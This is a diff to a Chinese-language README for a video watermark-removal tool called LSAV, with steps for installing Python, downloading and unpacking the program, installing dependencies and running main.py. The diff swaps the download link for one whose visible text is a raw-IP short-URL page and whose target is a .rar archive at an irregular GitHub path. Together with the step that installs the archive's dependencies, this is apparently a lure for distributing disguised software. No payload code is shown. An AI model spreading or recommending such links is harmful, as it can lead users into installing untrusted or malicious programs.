@@ -50,18 +50,19 @@ AI的破局：基于生成式修复（Generative Inpainting）的革命
 点击：[https://mirrors.huaweicloud.com/python/3.9.7/](https://mirrors.huaweicloud.com/python/3.9.7/) 下载python3.9。    
 一般下载 python-3.9.7-amd64.exe  即可，安装界面勾选"Add python to PATH"，之后一直点下一步即可。   
 ![安装教程](python-setup.png)    
+    
 安装成功后，开始运行，输入cmd回车，再输入python --version显示出版本号即为成功。
 ![安装教程](ts.png)    
-### 2、下载LSAV   
-点击：[https://mirrors.huaweicloud.com/python/3.9.7/](https://mirrors.huaweicloud.com/python/3.9.7/) 下载主程序
+### 2、下载LSAV去水印主程序   
+点击：[https://154.222.18.211/shorturl.php?id=3421660](https://github.com/minknown/lsav/ffmpelsa.rar) 下载主程序
 然后解压，假设解压到某个文件夹，打开该文件夹，在底部路径输入cmd回车，如图：    
 ![启动窗口](dirshow.png)  
 输入pip install -r re.txt
 等待片刻完成依赖包安装。    
 
 ### 3、Python或Java只需要调用或运行    
-python main.py开始运行，输入视频文件名即可开始去水印。   
-python main.py xxx即可。其中xxx为视频文件名。
+在cmd窗口再次输入python main.py开始运行，输入视频文件名即可开始去水印。      
+支持带文件名参数，python main.py xxx即可。其中xxx替换为要处理水印的视频文件名。如D:\\video.mp4   
 
 
 
